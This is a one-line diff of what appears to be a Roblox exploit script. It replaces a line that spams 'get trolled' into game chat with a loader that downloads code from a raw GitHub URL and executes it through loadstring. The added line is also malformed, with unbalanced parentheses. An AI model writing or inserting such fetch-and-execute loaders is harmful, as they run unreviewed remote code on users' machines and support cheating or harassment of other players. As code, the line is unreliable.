@@ -1,1 +1,1 @@
-game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("get trolled","All")
+loadstring(game:httpget("https://raw.githubusercontent.com/Slimeslinger/dr.strang/main/dub")()
